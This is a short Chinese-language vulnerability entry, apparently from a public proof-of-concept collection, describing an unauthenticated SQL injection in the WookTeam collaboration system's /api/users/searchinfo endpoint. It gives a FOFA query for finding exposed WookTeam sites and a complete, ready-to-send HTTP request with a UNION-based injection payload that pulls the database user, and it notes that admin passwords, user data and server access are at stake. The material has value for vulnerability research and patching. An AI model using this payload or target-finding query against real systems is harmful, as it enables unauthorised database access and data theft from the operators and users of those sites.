# WookTeam轻量级的团队在线协作系统接口searchinfo存在SQL注入漏洞

WookTeam /api/users/searchinfo 接口存在SQL注入漏洞，未经身份验证的恶意攻击者利用 SQL 注入漏洞获取数据库中的信息（例如管理员后台密码、站点用户个人信息）之外，攻击者甚至可以在高权限下向服务器写入命令，进一步获取服务器系统权限。

## fofa

```yaml
title="Wookteam"
```

## poc

```java
GET /api/users/searchinfo?where[username]=1%27%29+UNION+ALL+SELECT+NULL%2CCONCAT%280x7e%2Cuser%28%29%2C0x7e%29%2CNULL%2CNULL%2CNULL%23 HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cache-Control: max-age=0
Connection: keep-alive
Host: your-ip
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
```

![image-20240814095848331](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202408140959983.png)